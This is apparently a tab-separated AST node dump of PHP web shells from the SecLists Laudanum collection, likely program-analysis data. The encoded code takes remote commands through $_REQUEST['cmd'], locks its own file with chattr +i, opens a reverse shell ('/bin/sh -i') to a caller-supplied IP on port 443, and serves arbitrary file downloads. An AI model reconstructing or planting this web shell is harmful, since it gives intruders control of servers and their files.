id:int	labels:label	type	flags:string_array	lineno:int	code	childnum:int	funcid:int	classname	namespace	endlineno:int	name	doccomment
484	AST	AST_CALL		13		0	475		""			
485	AST	AST_NAME	NAME_NOT_FQ	13		0	475		""			
486	AST	string		13	"system"	0	475		""			
487	AST	AST_ARG_LIST		13		1	475		""			
488	AST	AST_ENCAPS_LIST		13		0	475		""			
489	AST	string		13	"chmod ugo-w "	0	475		""			
490	AST	AST_VAR		13		1	475		""			
491	AST	string		13	"this_file"	0	475		""			
492	AST	AST_UNARY_OP	UNARY_SILENCE	14		2	475		""			
493	AST	AST_CALL		14		0	475		""			
494	AST	AST_NAME	NAME_NOT_FQ	14		0	475		""			
495	AST	string		14	"system"	0	475		""			
496	AST	AST_ARG_LIST		14		1	475		""			
497	AST	AST_ENCAPS_LIST		14		0	475		""			
498	AST	string		14	"chattr +i "	0	475		""			
499	AST	AST_VAR		14		1	475		""			
500	AST	string		14	"this_file"	0	475		""			
501	AST	AST_ASSIGN		17		3	475		""			
502	AST	AST_VAR		17		0	475		""			
503	AST	string		17	"cmd"	0	475		""			
504	AST	string		17	"cmd"	1	475		""			
505	AST	AST_IF		20		4	475		""			
506	AST	AST_IF_ELEM		20		0	475		""			
507	AST	AST_ISSET		20		0	475		""			
508	AST	AST_DIM		20		0	475		""			
509	AST	AST_VAR		20		0	475		""			
510	AST	string		20	"_REQUEST"	0	475		""			
511	AST	AST_VAR		20		1	475		""			
512	AST	string		20	"cmd"	0	475		""			
513	AST	AST_STMT_LIST		20		1	475		""			
514	AST	AST_ASSIGN		23		0	475		""			
515	AST	AST_VAR		23		0	475		""			
516	AST	string		23	"command"	0	475		""			
517	AST	AST_DIM		23		1	475		""			
518	AST	AST_VAR		23		0	475		""			
519	AST	string		23	"_REQUEST"	0	475		""			
520	AST	AST_VAR		23		1	475		""			
521	AST	string		23	"cmd"	0	475		""			
522	AST	AST_CALL		24		1	475		""			
523	AST	AST_NAME	NAME_NOT_FQ	24		0	475		""			
524	AST	string		24	"executeCommand"	0	475		""			
525	AST	AST_ARG_LIST		24		1	475		""			
526	AST	AST_VAR		24		0	475		""			
527	AST	string		24	"command"	0	475		""			
528	AST	AST_IF_ELEM		26		1	475		""			
529	AST	NULL		26		0	475		""			
530	AST	AST_IF		26		1	475		""			
531	AST	AST_IF_ELEM		26		0	475		""			
532	AST	AST_BINARY_OP	BINARY_BOOL_AND	26		0	475		""			
533	AST	AST_ISSET		26		0	475		""			
534	AST	AST_DIM		26		0	475		""			
535	AST	AST_VAR		26		0	475		""			
536	AST	string		26	"_REQUEST"	0	475		""			
537	AST	AST_VAR		26		1	475		""			
538	AST	string		26	"ip"	0	475		""			
539	AST	AST_UNARY_OP	UNARY_BOOL_NOT	26		1	475		""			
540	AST	AST_ISSET		26		0	475		""			
541	AST	AST_DIM		26		0	475		""			
542	AST	AST_VAR		26		0	475		""			
543	AST	string		26	"_REQUEST"	0	475		""			
544	AST	AST_VAR		26		1	475		""			
545	AST	string		26	"cmd"	0	475		""			
546	AST	AST_STMT_LIST		26		1	475		""			
547	AST	AST_ASSIGN		28		0	475		""			
548	AST	AST_VAR		28		0	475		""			
549	AST	string		28	"ip"	0	475		""			
550	AST	AST_DIM		28		1	475		""			
551	AST	AST_VAR		28		0	475		""			
552	AST	string		28	"_REQUEST"	0	475		""			
553	AST	AST_VAR		28		1	475		""			
554	AST	string		28	"ip"	0	475		""			
555	AST	AST_ASSIGN		31		1	475		""			
556	AST	AST_VAR		31		0	475		""			
557	AST	string		31	"port"	0	475		""			
558	AST	string		31	"443"	1	475		""			
559	AST	AST_IF		33		2	475		""			
560	AST	AST_IF_ELEM		33		0	475		""			
561	AST	AST_ISSET		33		0	475		""			
562	AST	AST_DIM		33		0	475		""			
563	AST	AST_VAR		33		0	475		""			
564	AST	string		33	"_REQUEST"	0	475		""			
565	AST	AST_VAR		33		1	475		""			
566	AST	string		33	"ip"	0	475		""			
567	AST	AST_STMT_LIST		33		1	475		""			
568	AST	AST_ASSIGN		34		0	475		""			
569	AST	AST_VAR		34		0	475		""			
570	AST	string		34	"port"	0	475		""			
571	AST	AST_DIM		34		1	475		""			
572	AST	AST_VAR		34		0	475		""			
573	AST	string		34	"_REQUEST"	0	475		""			
574	AST	AST_VAR		34		1	475		""			
575	AST	string		34	"port"	0	475		""			
576	AST	AST_ASSIGN		38		3	475		""			
577	AST	AST_VAR		38		0	475		""			
578	AST	string		38	"sock"	0	475		""			
579	AST	AST_CALL		38		1	475		""			
580	AST	AST_NAME	NAME_NOT_FQ	38		0	475		""			
581	AST	string		38	"fsockopen"	0	475		""			
582	AST	AST_ARG_LIST		38		1	475		""			
583	AST	AST_VAR		38		0	475		""			
584	AST	string		38	"ip"	0	475		""			
585	AST	AST_VAR		38		1	475		""			
586	AST	string		38	"port"	0	475		""			
587	AST	AST_ASSIGN		39		4	475		""			
588	AST	AST_VAR		39		0	475		""			
589	AST	string		39	"command"	0	475		""			
590	AST	string		39	"/bin/sh -i <&3 >&3 2>&3"	1	475		""			
591	AST	AST_CALL		41		5	475		""			
592	AST	AST_NAME	NAME_NOT_FQ	41		0	475		""			
593	AST	string		41	"executeCommand"	0	475		""			
594	AST	AST_ARG_LIST		41		1	475		""			
595	AST	AST_VAR		41		0	475		""			
596	AST	string		41	"command"	0	475		""			
597	AST	AST_EXIT		45		5	475		""			
598	AST	NULL		45		0	475		""			
599	AST	AST_FUNC_DECL		47		6	475		""	82	executeCommand	
600	Artificial	CFG_FUNC_ENTRY					599		""		"executeCommand"	
601	Artificial	CFG_FUNC_EXIT					599		""		"executeCommand"	
602	AST	AST_PARAM_LIST		47		0	599		""			
603	AST	AST_PARAM		47		0	599		""			
604	AST	AST_NAME	NAME_NOT_FQ	47		0	599		""			
605	AST	string		47	"string"	0	599		""			
606	AST	string		47	"command"	1	599		""			
607	AST	NULL		47		2	599		""			
608	AST	NULL		47		1	599		""			
609	AST	AST_STMT_LIST		47		2	599		""			
610	AST	AST_IF		50		0	599		""			
611	AST	AST_IF_ELEM		50		0	599		""			
612	AST	AST_CALL		50		0	599		""			
613	AST	AST_NAME	NAME_NOT_FQ	50		0	599		""			
614	AST	string		50	"class_exists"	0	599		""			
615	AST	AST_ARG_LIST		50		1	599		""			
616	AST	string		50	"ReflectionFunction"	0	599		""			
617	AST	AST_STMT_LIST		50		1	599		""			
618	AST	AST_ASSIGN		53		0	599		""			
619	AST	AST_VAR		53		0	599		""			
620	AST	string		53	"function"	0	599		""			
621	AST	AST_NEW		53		1	599		""			
622	AST	AST_NAME	NAME_NOT_FQ	53		0	599		""			
623	AST	string		53	"ReflectionFunction"	0	599		""			
624	AST	AST_ARG_LIST		53		1	599		""			
625	AST	string		53	"system"	0	599		""			
626	AST	AST_METHOD_CALL		54		1	599		""			
627	AST	AST_VAR		54		0	599		""			
628	AST	string		54	"function"	0	599		""			
629	AST	string		54	"invoke"	1	599		""			
630	AST	AST_ARG_LIST		54		2	599		""			
631	AST	AST_VAR		54		0	599		""			
632	AST	string		54	"command"	0	599		""			
633	AST	AST_IF_ELEM		56		1	599		""			
634	AST	AST_CALL		56		0	599		""			
635	AST	AST_NAME	NAME_NOT_FQ	56		0	599		""			
636	AST	string		56	"function_exists"	0	599		""			
637	AST	AST_ARG_LIST		56		1	599		""			
638	AST	string		56	"call_user_func_array"	0	599		""			
639	AST	AST_STMT_LIST		56		1	599		""			
640	AST	AST_CALL		59		0	599		""			
641	AST	AST_NAME	NAME_NOT_FQ	59		0	599		""			
642	AST	string		59	"call_user_func_array"	0	599		""			
643	AST	AST_ARG_LIST		59		1	599		""			
644	AST	string		59	"system"	0	599		""			
645	AST	AST_ARRAY	"[WARNING] Unexpected flags for kind: kind=129 and flags=2"	59		1	599		""			
646	AST	AST_ARRAY_ELEM		59		0	599		""			
647	AST	AST_VAR		59		0	599		""			
648	AST	string		59	"command"	0	599		""			
649	AST	NULL		59		1	599		""			
650	AST	AST_IF_ELEM		61		2	599		""			
651	AST	AST_CALL		61		0	599		""			
652	AST	AST_NAME	NAME_NOT_FQ	61		0	599		""			
653	AST	string		61	"function_exists"	0	599		""			
654	AST	AST_ARG_LIST		61		1	599		""			
655	AST	string		61	"call_user_func"	0	599		""			
656	AST	AST_STMT_LIST		61		1	599		""			
657	AST	AST_CALL		64		0	599		""			
658	AST	AST_NAME	NAME_NOT_FQ	64		0	599		""			
659	AST	string		64	"call_user_func"	0	599		""			
660	AST	AST_ARG_LIST		64		1	599		""			
661	AST	string		64	"system"	0	599		""			
662	AST	AST_VAR		64		1	599		""			
663	AST	string		64	"command"	0	599		""			
664	AST	AST_IF_ELEM		66		3	599		""			
665	AST	NULL		66		0	599		""			
666	AST	AST_IF		66		1	599		""			
667	AST	AST_IF_ELEM		66		0	599		""			
668	AST	AST_CALL		66		0	599		""			
669	AST	AST_NAME	NAME_NOT_FQ	66		0	599		""			
670	AST	string		66	"function_exists"	0	599		""			
671	AST	AST_ARG_LIST		66		1	599		""			
672	AST	string		66	"passthru"	0	599		""			
673	AST	AST_STMT_LIST		66		1	599		""			
674	AST	AST_CALL		69		0	599		""			
675	AST	AST_NAME	NAME_NOT_FQ	69		0	599		""			
676	AST	string		69	"ob_start"	0	599		""			
677	AST	AST_ARG_LIST		69		1	599		""			
678	AST	AST_CALL		70		1	599		""			
679	AST	AST_NAME	NAME_NOT_FQ	70		0	599		""			
680	AST	string		70	"passthru"	0	599		""			
681	AST	AST_ARG_LIST		70		1	599		""			
682	AST	AST_VAR		70		0	599		""			
683	AST	string		70	"command"	0	599		""			
684	AST	AST_VAR		70		1	599		""			
685	AST	string		70	"return_var"	0	599		""			
686	AST	AST_ASSIGN		71		2	599		""			
687	AST	AST_VAR		71		0	599		""			
688	AST	string		71	"output"	0	599		""			
689	AST	AST_CALL		71		1	599		""			
690	AST	AST_NAME	NAME_NOT_FQ	71		0	599		""			
691	AST	string		71	"ob_get_contents"	0	599		""			
692	AST	AST_ARG_LIST		71		1	599		""			
693	AST	AST_CALL		72		3	599		""			
694	AST	AST_NAME	NAME_NOT_FQ	72		0	599		""			
695	AST	string		72	"ob_end_clean"	0	599		""			
696	AST	AST_ARG_LIST		72		1	599		""			
697	AST	AST_IF_ELEM		74		1	599		""			
698	AST	NULL		74		0	599		""			
699	AST	AST_IF		74		1	599		""			
700	AST	AST_IF_ELEM		74		0	599		""			
701	AST	AST_CALL		74		0	599		""			
702	AST	AST_NAME	NAME_NOT_FQ	74		0	599		""			
703	AST	string		74	"function_exists"	0	599		""			
704	AST	AST_ARG_LIST		74		1	599		""			
705	AST	string		74	"system"	0	599		""			
706	AST	AST_STMT_LIST		74		1	599		""			
707	AST	AST_CALL		80		0	599		""			
708	AST	AST_NAME	NAME_NOT_FQ	80		0	599		""			
709	AST	string		80	"system"	0	599		""			
710	AST	AST_ARG_LIST		80		1	599		""			
711	AST	AST_VAR		80		0	599		""			
712	AST	string		80	"command"	0	599		""			
713	AST	NULL		47		3	599		""			
714	Filesystem	Directory									"WordPress"	
715	Filesystem	File									"file.php"	
716	AST	AST_TOPLEVEL	TOPLEVEL_FILE	1					""	195	"/data/seongil/26529,danielmiessler,SecLists/code/Web-Shells/laudanum-0.8/php/file.php"	
717	Artificial	CFG_FUNC_ENTRY					716				"/data/seongil/26529,danielmiessler,SecLists/code/Web-Shells/laudanum-0.8/php/file.php"	
718	Artificial	CFG_FUNC_EXIT					716				"/data/seongil/26529,danielmiessler,SecLists/code/Web-Shells/laudanum-0.8/php/file.php"	
719	AST	AST_STMT_LIST		1		0	716		""			
720	AST	AST_ASSIGN		43		0	716		""			
721	AST	AST_VAR		43		0	716		""			
722	AST	string		43	"allowedIPs"	0	716		""			
723	AST	AST_ARRAY	"[WARNING] Unexpected flags for kind: kind=129 and flags=2"	43		1	716		""			
724	AST	AST_ARRAY_ELEM		43		0	716		""			
725	AST	string		43	"192.168.1.1"	0	716		""			
726	AST	NULL		43		1	716		""			
727	AST	AST_ARRAY_ELEM		43		1	716		""			
728	AST	string		43	"127.0.0.1"	0	716		""			
729	AST	NULL		43		1	716		""			
730	AST	AST_ASSIGN		47		1	716		""			
731	AST	AST_VAR		47		0	716		""			
732	AST	string		47	"allowed"	0	716		""			
733	AST	integer		47	0	1	716		""			
734	AST	AST_FOREACH		48		2	716		""			
735	AST	AST_VAR		48		0	716		""			
736	AST	string		48	"allowedIPs"	0	716		""			
737	AST	AST_VAR		48		1	716		""			
738	AST	string		48	"IP"	0	716		""			
739	AST	NULL		48		2	716		""			
740	AST	AST_STMT_LIST		48		3	716		""			
741	AST	AST_IF		49		0	716		""			
742	AST	AST_IF_ELEM		49		0	716		""			
743	AST	AST_BINARY_OP	BINARY_IS_EQUAL	49		0	716		""			
744	AST	AST_DIM		49		0	716		""			
745	AST	AST_VAR		49		0	716		""			
746	AST	string		49	"_SERVER"	0	716		""			
747	AST	string		49	"REMOTE_ADDR"	1	716		""			
748	AST	AST_VAR		49		1	716		""			
749	AST	string		49	"IP"	0	716		""			
750	AST	AST_ASSIGN		50		1	716		""			
751	AST	AST_VAR		50		0	716		""			
752	AST	string		50	"allowed"	0	716		""			
753	AST	integer		50	1	1	716		""			
754	AST	AST_IF		53		3	716		""			
755	AST	AST_IF_ELEM		53		0	716		""			
756	AST	AST_BINARY_OP	BINARY_IS_EQUAL	53		0	716		""			
757	AST	AST_VAR		53		0	716		""			
758	AST	string		53	"allowed"	0	716		""			
759	AST	integer		53	0	1	716		""			
760	AST	AST_STMT_LIST		53		1	716		""			
761	AST	AST_CALL		54		0	716		""			
762	AST	AST_NAME	NAME_NOT_FQ	54		0	716		""			
763	AST	string		54	"header"	0	716		""			
764	AST	AST_ARG_LIST		54		1	716		""			
765	AST	string		54	"HTTP/1.0 404 Not Found"	0	716		""			
766	AST	AST_EXIT		55		1	716		""			
767	AST	NULL		55		0	716		""			
768	AST	AST_FUNC_DECL		62		4	716		""	90	error_handler	
769	Artificial	CFG_FUNC_ENTRY					768		""		"error_handler"	
770	Artificial	CFG_FUNC_EXIT					768		""		"error_handler"	
771	AST	AST_PARAM_LIST		62		0	768		""			
772	AST	AST_PARAM		62		0	768		""			
773	AST	NULL		62		0	768		""			
774	AST	string		62	"errno"	1	768		""			
775	AST	NULL		62		2	768		""			
776	AST	AST_PARAM		62		1	768		""			
777	AST	NULL		62		0	768		""			
778	AST	string		62	"errstr"	1	768		""			
779	AST	NULL		62		2	768		""			
780	AST	AST_PARAM		62		2	768		""			
781	AST	NULL		62		0	768		""			
782	AST	string		62	"errfile"	1	768		""			
783	AST	NULL		62		2	768		""			
784	AST	AST_PARAM		62		3	768		""			
785	AST	NULL		62		0	768		""			
786	AST	string		62	"errline"	1	768		""			
787	AST	NULL		62		2	768		""			
788	AST	AST_PARAM		62		4	768		""			
789	AST	NULL		62		0	768		""			
790	AST	string		62	"errcontext"	1	768		""			
791	AST	NULL		62		2	768		""			
792	AST	NULL		62		1	768		""			
793	AST	AST_STMT_LIST		62		2	768		""			
794	AST	AST_IF		66		0	768		""			
795	AST	AST_IF_ELEM		66		0	768		""			
796	AST	AST_BINARY_OP	BINARY_IS_EQUAL	66		0	768		""			
797	AST	AST_CALL		66		0	768		""			
798	AST	AST_NAME	NAME_NOT_FQ	66		0	768		""			
799	AST	string		66	"error_reporting"	0	768		""			
800	AST	AST_ARG_LIST		66		1	768		""			
801	AST	integer		66	0	1	768		""			
802	AST	AST_STMT_LIST		66		1	768		""			
803	AST	AST_ASSIGN_OP	BINARY_CONCAT	67		0	768		""			
804	AST	AST_DIM		67		0	768		""			
805	AST	AST_VAR		67		0	768		""			
806	AST	string		67	"_SESSION"	0	768		""			
807	AST	string		67	"output"	1	768		""			
808	AST	AST_BINARY_OP	BINARY_CONCAT	67		1	768		""			
809	AST	AST_VAR		67		0	768		""			
810	AST	string		67	"errstr"	0	768		""			
811	AST	string		67	"\n"	1	768		""			
812	AST	AST_IF_ELEM		68		1	768		""			
813	AST	NULL		68		0	768		""			
814	AST	AST_STMT_LIST		68		1	768		""			
815	AST	AST_EXIT		69		0	768		""			
816	AST	AST_BINARY_OP	BINARY_CONCAT	69		0	768		""			
817	AST	AST_BINARY_OP	BINARY_CONCAT	69		0	768		""			
818	AST	AST_BINARY_OP	BINARY_CONCAT	69		0	768		""			
819	AST	AST_BINARY_OP	BINARY_CONCAT	69		0	768		""			
820	AST	AST_BINARY_OP	BINARY_CONCAT	69		0	768		""			
821	AST	AST_BINARY_OP	BINARY_CONCAT	69		0	768		""			
822	AST	string		69	"<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"\n   \"http://www.w3.org/TR/html4/strict.dtd\">\n<html>\n<head>\n  <title>Laudanum PHP File Browser</title>\n</head>\n<body>\n  <h1>Fatal Error!</h1>\n  <p><b>"	0	768		""			
823	AST	AST_VAR		77		1	768		""			
824	AST	string		77	"errstr"	0	768		""			
825	AST	string		69	"</b></p>\n  <p>in <b>"	1	768		""			
826	AST	AST_VAR		78		1	768		""			
827	AST	string		78	"errfile"	0	768		""			
828	AST	string		69	"</b>, line <b>"	1	768		""			
829	AST	AST_VAR		78		1	768		""			
830	AST	string		78	"errline"	0	768		""			
831	AST	string		69	"</b>.</p>\n\n  <hr>\n  <address>\n  Copyright &copy; 2012, <a href=\"mailto:[email]\">Kevin Johnson</a> and the Laudanum team.<br/>\n  Written by Tim Medin.<br/>\n  Get the latest version at <a href=\"http://laudanum.secureideas.net\">laudanum.secureideas.net</a>.\n  </address>\n\n</body>\n</html>"	1	768		""			
832	AST	NULL		62		3	768		""			
833	AST	AST_CALL		92		5	716		""			
834	AST	AST_NAME	NAME_NOT_FQ	92		0	716		""			
835	AST	string		92	"set_error_handler"	0	716		""			
836	AST	AST_ARG_LIST		92		1	716		""			
837	AST	string		92	"error_handler"	0	716		""			
838	AST	AST_ASSIGN		96		6	716		""			
839	AST	AST_VAR		96		0	716		""			
840	AST	string		96	"dir"	0	716		""			
841	AST	AST_CONDITIONAL		96		1	716		""			
842	AST	AST_ISSET		96		0	716		""			
843	AST	AST_DIM		96		0	716		""			
844	AST	AST_VAR		96		0	716		""			
845	AST	string		96	"_GET"	0	716		""			
846	AST	string		96	"dir"	1	716		""			
847	AST	AST_DIM		96		1	716		""			
848	AST	AST_VAR		96		0	716		""			
849	AST	string		96	"_GET"	0	716		""			
850	AST	string		96	"dir"	1	716		""			
851	AST	string		96	"."	2	716		""			
852	AST	AST_ASSIGN		97		7	716		""			
853	AST	AST_VAR		97		0	716		""			
854	AST	string		97	"file"	0	716		""			
855	AST	AST_CONDITIONAL		97		1	716		""			
856	AST	AST_ISSET		97		0	716		""			
857	AST	AST_DIM		97		0	716		""			
858	AST	AST_VAR		97		0	716		""			
859	AST	string		97	"_GET"	0	716		""			
860	AST	string		97	"file"	1	716		""			
861	AST	AST_DIM		97		1	716		""			
862	AST	AST_VAR		97		0	716		""			
863	AST	string		97	"_GET"	0	716		""			
864	AST	string		97	"file"	1	716		""			
865	AST	string		97	""	2	716		""			
866	AST	AST_IF		99		8	716		""			
867	AST	AST_IF_ELEM		99		0	716		""			
868	AST	AST_BINARY_OP	BINARY_IS_NOT_EQUAL	99		0	716		""			
869	AST	AST_VAR		99		0	716		""			
870	AST	string		99	"file"	0	716		""			
871	AST	string		99	""	1	716		""			
872	AST	AST_STMT_LIST		99		1	716		""			
873	AST	AST_IF		100		0	716		""			
874	AST	AST_IF_ELEM		100		0	716		""			
875	AST	AST_CALL		100		0	716		""			
876	AST	AST_NAME	NAME_NOT_FQ	100		0	716		""			
877	AST	string		100	"file_exists"	0	716		""			
878	AST	AST_ARG_LIST		100		1	716		""			
879	AST	AST_VAR		100		0	716		""			
880	AST	string		100	"file"	0	716		""			
881	AST	AST_STMT_LIST		100		1	716		""			
882	AST	AST_ASSIGN		102		0	716		""			
883	AST	AST_VAR		102		0	716		""			
884	AST	string		102	"s"	0	716		""			
885	AST	AST_CALL		102		1	716		""			
886	AST	AST_NAME	NAME_NOT_FQ	102		0	716		""			
887	AST	string		102	"split"	0	716		""			
888	AST	AST_ARG_LIST		102		1	716		""			
889	AST	string		102	"/"	0	716		""			
890	AST	AST_VAR		102		1	716		""			
891	AST	string		102	"file"	0	716		""			
892	AST	AST_ASSIGN		103		1	716		""			
893	AST	AST_VAR		103		0	716		""			
894	AST	string		103	"filename"	0	716		""			
895	AST	AST_DIM		103		1	716		""			
896	AST	AST_VAR		103		0	716		""			
897	AST	string		103	"s"	0	716		""			
898	AST	AST_BINARY_OP	BINARY_SUB	103		1	716		""			
899	AST	AST_CALL		103		0	716		""			
900	AST	AST_NAME	NAME_NOT_FQ	103		0	716		""			
901	AST	string		103	"count"	0	716		""			
902	AST	AST_ARG_LIST		103		1	716		""			
903	AST	AST_VAR		103		0	716		""			
904	AST	string		103	"s"	0	716		""			
905	AST	integer		103	1	1	716		""			
906	AST	AST_CALL		104		2	716		""			
907	AST	AST_NAME	NAME_NOT_FQ	104		0	716		""			
908	AST	string		104	"header"	0	716		""			
909	AST	AST_ARG_LIST		104		1	716		""			
910	AST	string		104	"Content-type: application/x-download"	0	716		""			
911	AST	AST_CALL		105		3	716		""			
912	AST	AST_NAME	NAME_NOT_FQ	105		0	716		""			
913	AST	string		105	"header"	0	716		""			
914	AST	AST_ARG_LIST		105		1	716		""			
915	AST	AST_BINARY_OP	BINARY_CONCAT	105		0	716		""			
916	AST	string		105	"Content-Length: "	0	716		""			
917	AST	AST_CALL		105		1	716		""			
918	AST	AST_NAME	NAME_NOT_FQ	105		0	716		""			
919	AST	string		105	"filesize"	0	716		""			
920	AST	AST_ARG_LIST		105		1	716		""			
921	AST	AST_VAR		105		0	716		""			
922	AST	string		105	"file"	0	716		""			
923	AST	AST_CALL		106		4	716		""			
924	AST	AST_NAME	NAME_NOT_FQ	106		0	716		""			
925	AST	string		106	"header"	0	716		""			
926	AST	AST_ARG_LIST		106		1	716		""			
927	AST	AST_BINARY_OP	BINARY_CONCAT	106		0	716		""			
928	AST	AST_BINARY_OP	BINARY_CONCAT	106		0	716		""			
929	AST	string		106	"Content-Disposition: attachment; filename=\""	0	716		""			
930	AST	AST_VAR		106		1	716		""			
931	AST	string		106	"filename"	0	716		""			
932	AST	string		106	"\""	1	716		""			
933	AST	AST_CALL		107		5	716		""			
934	AST	AST_NAME	NAME_NOT_FQ	107		0	716		""			
935	AST	string		107	"readfile"	0	716		""			
936	AST	AST_ARG_LIST		107		1	716		""			
937	AST	AST_VAR		107		0	716		""			
938	AST	string		107	"file"	0	716		""			
939	AST	AST_EXIT		108		6	716		""			
940	AST	NULL		108		0	716		""			
941	AST	NULL		1		9	716		""			
942	AST	AST_ECHO		112		10	716		""			
943	AST	string		112	"<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"\n   \"http://www.w3.org/TR/html4/strict.dtd\">\n<html>\n<head>\n  <title>Laudanum File Browser</title>\n  <link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n\n  <script type=\"text/javascript\">\n  </script>\n</head>\n<body onload=\"init()\">\n\n<h1>Laudanum File Browser 0.1</h1>\n<a href=\""	0	716		""			
944	AST	AST_ECHO		125		11	716		""			
945	AST	AST_DIM		125		0	716		""			
946	AST	AST_VAR		125		0	716		""			
947	AST	string		125	"_SERVER"	0	716		""			
948	AST	string		125	"PHP_SELF"	1	716		""			
949	AST	AST_ECHO		125		12	716		""			
950	AST	string		125	"\">Home</a><br/>\n\n"	0	716		""			
951	AST	AST_ASSIGN		129		13	716		""			
952	AST	AST_VAR		129		0	716		""			
953	AST	string		129	"curdir"	0	716		""			
954	AST	AST_CALL		129		1	716		""			
955	AST	AST_NAME	NAME_NOT_FQ	129		0	716		""			
956	AST	string		129	"realpath"	0	716		""			
957	AST	AST_ARG_LIST		129		1	716		""			
958	AST	AST_VAR		129		0	716		""			
959	AST	string		129	"dir"	0	716		""			
960	AST	AST_ASSIGN_OP	BINARY_CONCAT	130		14	716		""			
961	AST	AST_VAR		130		0	716		""			
962	AST	string		130	"curdir"	0	716		""			
963	AST	AST_CONDITIONAL		130		1	716		""			
964	AST	AST_BINARY_OP	BINARY_IS_NOT_EQUAL	130		0	716		""			
965	AST	AST_CALL		130		0	716		""			
966	AST	AST_NAME	NAME_NOT_FQ	130		0	716		""			
967	AST	string		130	"substr"	0	716		""			
968	AST	AST_ARG_LIST		130		1	716		""			
969	AST	AST_VAR		130		0	716		""			
970	AST	string		130	"curdir"	0	716		""			
971	AST	AST_UNARY_OP	UNARY_MINUS	130		1	716		""			
972	AST	integer		130	1	0	716		""			
973	AST	string		130	"/"	1	716		""			
974	AST	string		130	"/"	1	716		""			
975	AST	string		130	""	2	716		""			
976	AST	AST_ASSIGN		132		15	716		""			
977	AST	AST_VAR		132		0	716		""			
978	AST	string		132	"dirs"	0	716		""			
979	AST	AST_CALL		132		1	716		""			
980	AST	AST_NAME	NAME_NOT_FQ	132		0	716		""			
981	AST	string		132	"split"	0	716		""			
982	AST	AST_ARG_LIST		132		1	716		""			
983	AST	string		132	"/"	0	716		""			
984	AST	AST_VAR		132		1	716		""			
985	AST	string		132	"curdir"	0	716		""			
986	AST	AST_ECHO		135		16	716		""			
987	AST	AST_BINARY_OP	BINARY_CONCAT	135		0	716		""			
988	AST	AST_BINARY_OP	BINARY_CONCAT	135		0	716		""			
989	AST	string		135	"<h2>Directory listing of <a href=\""	0	716		""			
990	AST	AST_DIM		135		1	716		""			
991	AST	AST_VAR		135		0	716		""			
992	AST	string		135	"_SERVER"	0	716		""			
993	AST	string		135	"PHP_SELF"	1	716		""			
994	AST	string		135	"?dir=/\">/</a> "	1	716		""			
995	AST	AST_ASSIGN		136		17	716		""			
996	AST	AST_VAR		136		0	716		""			
997	AST	string		136	"breadcrumb"	0	716		""			
998	AST	string		136	"/"	1	716		""			
999	AST	AST_FOREACH		137		18	716		""			
1000	AST	AST_VAR		137		0	716		""			
1001	AST	string		137	"dirs"	0	716		""			
1002	AST	AST_VAR		137		1	716		""			
1003	AST	string		137	"d"	0	716		""			
1004	AST	NULL		137		2	716		""			
1005	AST	AST_STMT_LIST		137		3	716		""			
1006	AST	AST_IF		138		0	716		""			
1007	AST	AST_IF_ELEM		138		0	716		""			
1008	AST	AST_BINARY_OP	BINARY_IS_NOT_EQUAL	138		0	716		""			
1009	AST	AST_VAR		138		0	716		""			
1010	AST	string		138	"d"	0	716		""			
1011	AST	string		138	""	1	716		""			
1012	AST	AST_STMT_LIST		138		1	716		""			
1013	AST	AST_ASSIGN_OP	BINARY_CONCAT	139		0	716		""			
1014	AST	AST_VAR		139		0	716		""			
1015	AST	string		139	"breadcrumb"	0	716		""			
